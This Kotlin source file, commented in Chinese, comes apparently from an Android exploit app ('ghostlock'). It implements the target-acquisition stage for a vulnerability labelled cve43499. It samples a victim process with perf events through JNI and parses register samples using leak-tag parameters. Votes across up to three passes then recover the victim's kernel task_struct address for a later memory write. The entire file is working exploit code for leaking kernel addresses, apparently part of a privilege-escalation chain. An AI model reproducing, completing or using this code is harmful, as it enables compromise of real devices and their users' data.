package com.ghostlock.app.backend.backends.cve43499.perf

import com.ghostlock.app.backend.backends.cve43499.flow.Cve43499TargetAcquisition
import com.ghostlock.app.backend.backends.cve43499.flow.Cve43499TargetEvidence
import com.ghostlock.app.backend.backends.cve43499.flow.Cve43499VictimContext
import com.ghostlock.app.backend.backends.cve43499.flow.Cve43499WriteTargetSource
import com.ghostlock.app.data.cve43499.DebugExecutionParameters
import com.ghostlock.app.data.cve43499.DebugPerfParameters
import com.ghostlock.app.jni.Native43499CloseResult
import com.ghostlock.app.jni.Native43499Jni
import com.ghostlock.app.jni.Native43499PerfCollectResult
import com.ghostlock.app.jni.Native43499PerfOpenRequest
import com.ghostlock.app.jni.Native43499PerfOpenResult
import kotlin.math.ceil

/**
 * perf 目标源：App 进程跨任务采样 victim + Kotlin 解析/投票/地址校验（R3e-2）。
 *
 * 实现设计 §B3「方案 B」：最多 3 个 pass；基础设施/parser 失败立即 abort；低票
 * 异地址 pass 不 abort、也不参与门槛。2-of-3 选中地址后，门槛只按**同意 pass**
 * 聚合：`threshold=max(64, ceil(0.25×agree_candidates))`，`agree_votes>=threshold`
 * 才返回 Acquired。对齐/SP 默认只记 evidence，`require_*`=1 时硬校验。
 *
 * @param native Native seam（生产=JNI，测试=fake）。
 * @param perf debug 配置（`perf.enabled=1` 才会被构造；参数缺失/非法 fail-closed）。
 * @param execution execution 参数（pageSize/identity 窗/leak tag 单一来源）。
 * @note 阶段：R3e-2；默认关闭（debug 资产 `perf.enabled=0`），G1 后启用。
 */
internal class Cve43499PerfTargetSource(
    private val native: Cve43499PerfNative,
    private val perf: DebugPerfParameters,
    private val execution: DebugExecutionParameters,
) : Cve43499WriteTargetSource {

    /** 单个 pass 的结局（内部）。 */
    private sealed interface PassOutcome {
        /** pass 成功：给出该 pass 的投票地址 + close retained 事实。 */
        data class Sampled(
            val result: Cve43499PerfPass.Address,
            val closeRetained: Boolean,
        ) : PassOutcome

        /** pass 失败（infra/parser；立即 abort 整个 acquisition）；携带 close retained 事实。 */
        data class Failed(
            val reason: String,
            val closeRetained: Boolean,
        ) : PassOutcome
    }

    /**
     * 取 victim task_struct 地址（≤3 pass、2-of-3、同意 pass 聚合门槛）。
     *
     * @param context 采样前基线 + pump（Flow 提供）。
     * @return Acquired（地址+证据）或 Missing（具名原因）。
     */
    override fun acquire(context: Cve43499VictimContext): Cve43499TargetAcquisition {
        val config = buildParseConfig()
            ?: return Cve43499TargetAcquisition.Missing(CONFIG_INVALID)
        val ringBytes = ringBytes()
            ?: return Cve43499TargetAcquisition.Missing(CONFIG_INVALID)
        val passes = mutableListOf<Cve43499PerfPass.Address>()
        var closeRetained = false
        for (pass in 1..perf.maxPasses) {
            when (val outcome = runPass(context, ringBytes, config)) {
                is PassOutcome.Failed ->
                    return Cve43499TargetAcquisition.Missing(
                        outcome.reason,
                        outcome.closeRetained,
                    )
                is PassOutcome.Sampled -> {
                    passes += outcome.result
                    if (outcome.closeRetained) closeRetained = true
                }
            }
            if (passes.size >= 2 && selectTwoOfThree(passes) != null) break
        }
        val selected = selectTwoOfThree(passes)
            ?: return Cve43499TargetAcquisition.Missing("perf-agreement-failed")
        val agreeing = passes.filter { it.address == selected.address }
        val agreeVotes = agreeing.sumOf { it.votes }
        val agreeCandidates = agreeing.sumOf { it.candidates }
        val threshold = threshold(agreeCandidates)
        if (agreeCandidates < perf.minVotesFloor) {
            return Cve43499TargetAcquisition.Missing("perf-insufficient-candidates")
        }
        if (agreeVotes < threshold) {
            return Cve43499TargetAcquisition.Missing("perf-votes-below-threshold")
        }
        val requireAlignment = perf.requireAlignment == 1
        val requireSpEvidence = perf.requireSpEvidence == 1
        if (requireAlignment && !selected.alignmentOk) {
            return Cve43499TargetAcquisition.Missing("perf-address-untrusted:alignment")
        }
        if (requireSpEvidence && !selected.spEvidenceOk) {
            return Cve43499TargetAcquisition.Missing("perf-address-untrusted:sp-evidence")
        }
        val evidence = Cve43499TargetEvidence(
            baseline = context.baseline,
            passes = passes.size,
            passAddresses = passes.map { it.address },
            votes = agreeVotes,
            candidates = agreeCandidates,
            threshold = threshold,
            spVotes = agreeing.sumOf { it.spVotes },
            alignmentOk = selected.alignmentOk,
            spEvidenceOk = selected.spEvidenceOk,
            requireAlignment = requireAlignment,
            requireSpEvidence = requireSpEvidence,
            settleUs = perf.settleAfterAcquireUs,
            closeRetained = closeRetained,
        )
        return Cve43499TargetAcquisition.Acquired(
            victimTaskAddress = selected.address,
            evidence = evidence,
        )
    }

    /**
     * 执行一个 pass：open→pump→collect→close（close 走 finally 保证唯一一次）。
     *
     * @param context 采样上下文（pid/pump）。
     * @param ringBytes 环数据区容量。
     * @param config 解析配置。
     * @return Sampled 或 Failed（具名）。
     */
    private fun runPass(
        context: Cve43499VictimContext,
        ringBytes: Long,
        config: Cve43499PerfParseConfig,
    ): PassOutcome {
        val request = openRequest(context.baseline.pid)
            ?: return PassOutcome.Failed(CONFIG_INVALID, false)
        val openResult = Native43499PerfOpenResult()
        val handle = native.open(request, openResult)
        if (handle == Native43499Jni.RESULT_NOT_ACCEPTED_HANDLE) {
            return PassOutcome.Failed("perf-jni-not-accepted", false)
        }
        if (handle == Native43499Jni.RESULT_INCOMPLETE_HANDLE) {
            return PassOutcome.Failed("perf-jni-incomplete", false)
        }
        if (handle <= 0L) {
            return PassOutcome.Failed(openFailureReason(openResult), false)
        }
        val owner = Cve43499PerfOwner.wrap(native, handle)
        var sampled: Cve43499PerfPass.Address? = null
        var failure: String? = null
        var closeRetained = false
        try {
            val pumpReason = context.pump(perf.pumpIterations, perf.pumpBudgetNanos)
            if (pumpReason != null) {
                failure = "perf-pump-failed:" + pumpReason
            } else {
                val out = ByteArray(ringBytes.toInt())
                val collected = Native43499PerfCollectResult()
                val status = owner.collect(out, collected)
                when {
                    status == Native43499Jni.RESULT_NOT_ACCEPTED_INT ->
                        failure = "perf-jni-not-accepted"
                    status == Native43499Jni.RESULT_INCOMPLETE_INT ->
                        failure = "perf-jni-incomplete"
                    status != 0 ->
                        failure = "perf-collect-failed:" + collected.systemError
                    collected.bytesCopied != ringBytes ||
                        collected.dataSize != ringBytes ->
                        failure = "perf-ring-geometry-mismatch"
                    else -> {
                        val parsed = Cve43499PerfSampleParser.parse(
                            ring = out,
                            dataSize = collected.dataSize,
                            dataHead = collected.dataHead,
                            dataTailBefore = collected.dataTailBefore,
                            config = config,
                        )
                        when (parsed) {
                            is Cve43499PerfPass.Missing -> failure = parsed.reason
                            is Cve43499PerfPass.Address -> sampled = parsed
                        }
                    }
                }
            }
        } finally {
            /* close 唯一一次（Kotlin owner 契约）；retained 事实随成功/失败透传。 */
            val closeResult = Native43499CloseResult()
            owner.close(closeResult)
            if (closeResult.retainedForProcessExit) closeRetained = true
        }
        val reason = failure
        if (reason != null) return PassOutcome.Failed(reason, closeRetained)
        val address = sampled ?: return PassOutcome.Failed("perf-internal-error", closeRetained)
        return PassOutcome.Sampled(address, closeRetained)
    }

    /**
     * 2-of-3：返回出现 ≥2 次的地址（按 pass 顺序取先出现的地址）。
     *
     * @param passes 已完成 pass 的地址列表（2..3 个）。
     * @return 选中地址；无地址出现 ≥2 次返回 null。
     */
    private fun selectTwoOfThree(
        passes: List<Cve43499PerfPass.Address>,
    ): Cve43499PerfPass.Address? {
        val groups = linkedMapOf<Long, MutableList<Cve43499PerfPass.Address>>()
        for (pass in passes) {
            groups.getOrPut(pass.address) { mutableListOf() }.add(pass)
        }
        for ((_, group) in groups) {
            if (group.size >= 2) return group.first()
        }
        return null
    }

    /**
     * 同意 pass 聚合门槛：`max(min_votes_floor, ceil(min_votes_ratio×candidates))`。
     *
     * @param agreeCandidates 同意 pass 的候选数合计。
     * @return 票数门槛（>0）。
     */
    private fun threshold(agreeCandidates: Long): Long {
        val ratioPart = ceil(perf.minVotesRatio * agreeCandidates.toDouble()).toLong()
        return maxOf(perf.minVotesFloor, ratioPart)
    }

    /**
     * @return open 请求（15 字段全显式）；非法数值返回 null。
     */
    private fun openRequest(pid: Int): Native43499PerfOpenRequest? {
        if (pid < 0) return null
        return Native43499PerfOpenRequest(
            pid = pid.toLong(),
            cpu = -1L,
            attrType = perf.attrType,
            attrConfig = perf.attrConfig,
            attrSamplePeriod = perf.attrSamplePeriod,
            attrSampleType = perf.attrSampleType,
            attrSampleRegsIntr = perf.attrSampleRegsIntr,
            attrFlags = perf.attrFlags,
            attrDisabled = perf.attrDisabled,
            excludeUser = perf.excludeUser,
            excludeHv = perf.excludeHv,
            excludeIdle = perf.excludeIdle,
            pageSize = execution.pageSize,
            ringPages = perf.ringPages,
            autoEnable = perf.autoEnable,
        )
    }

    /**
     * @return 环数据区字节数（Int 可表示）；非法返回 null。
     */
    private fun ringBytes(): Long? {
        if (execution.pageSize <= 0L || perf.ringPages <= 0L) return null
        if (execution.pageSize > Int.MAX_VALUE.toLong() / perf.ringPages) return null
        val bytes = execution.pageSize * perf.ringPages
        if (bytes <= 0L || bytes > Int.MAX_VALUE.toLong()) return null
        return bytes
    }

    /**
     * 校验 debug 配置并构造解析配置（失败 ⇒ `perf-config-invalid`）。
     *
     * @return 解析配置；非法返回 null。
     */
    private fun buildParseConfig(): Cve43499PerfParseConfig? {
        if (perf.enabled != 1) return null
        if (perf.maxPasses !in 2..3) return null
        if (perf.minVotesFloor <= 0L) return null
        if (perf.minVotesRatio <= 0.0 || perf.minVotesRatio > 1.0) return null
        if (perf.registerCount !in 1..63) return null
        if (perf.spRegisterIndex !in 0 until perf.registerCount) return null
        if (perf.candidateCapacity !in 1..65536) return null
        if (execution.pageSize <= 0L || perf.ringPages <= 0L) return null
        if (execution.identityStart >= execution.identityEnd) return null
        /* 内核 perf mmap 要求数据页数为 2 的幂（机制约束）。 */
        if (perf.ringPages and (perf.ringPages - 1L) != 0L) return null
        /* tagShift==0 时 nibble 必须为 0，否则还原参数无意义（防止配置自相矛盾）。 */
        if (execution.leakTagShift == 0L && execution.leakTagNibble != 0L) return null
        if (perf.taskAlignment < 0L) return null
        if (perf.requireAlignment !in 0..1 || perf.requireSpEvidence !in 0..1) return null
        if (perf.pumpIterations <= 0L || perf.pumpBudgetNanos < 0L) return null
        if (perf.settleAfterAcquireUs < 0L) return null
        if (execution.leakTagNibble !in 0L..15L) return null
        if (execution.leakTagShift !in 0L..63L) return null
        val expectedSampleType = Cve43499PerfSampleFormat.SAMPLE_IP_BIT or
            Cve43499PerfSampleFormat.SAMPLE_REGS_INTR_BIT
        if (perf.attrSampleType != expectedSampleType) return null
        if (perf.attrDisabled != 1L || perf.autoEnable !in 0L..1L) return null
        if (perf.attrSampleRegsIntr != (1L shl perf.registerCount) - 1L) return null
        return Cve43499PerfParseConfig(
            identityStart = execution.identityStart,
            identityEnd = execution.identityEnd,
            tagNibble = execution.leakTagNibble,
            tagShift = execution.leakTagShift,
            registerCount = perf.registerCount,
            spRegisterIndex = perf.spRegisterIndex,
            candidateCapacity = perf.candidateCapacity,
            sampleType = perf.attrSampleType,
            taskAlignment = perf.taskAlignment,
        )
    }

    /**
     * 把 open 回执映射成稳定 reason 前缀（errno 语义分类）。
     *
     * @param result open 回执。
     * @return `perf-open-denied`/`perf-open-unsupported`/`perf-open-failed:<errno>`。
     */
    private fun openFailureReason(result: Native43499PerfOpenResult): String {
        if (result.callStatus != CALL_SYSTEM_ERROR) {
            return "perf-open-failed:" + result.callStatus
        }
        return when (result.systemError) {
            ERRNO_EPERM, ERRNO_EACCES -> "perf-open-denied"
            ERRNO_EINVAL, ERRNO_ENOSYS -> "perf-open-unsupported"
            else -> "perf-open-failed:" + result.systemError
        }
    }

    private companion object {
        /** 配置/机制不变量失败 reason。 */
        const val CONFIG_INVALID: String = "perf-config-invalid"

        /** `GLK43499_CALL_SYSTEM_ERROR`（core 回执枚举）。 */
        const val CALL_SYSTEM_ERROR: Int = 8

        /** Linux errno 分类（只用于 reason 文本，不参与判定）。 */
        const val ERRNO_EPERM: Int = 1
        const val ERRNO_EACCES: Int = 13
        const val ERRNO_EINVAL: Int = 22
        const val ERRNO_ENOSYS: Int = 38
    }
}
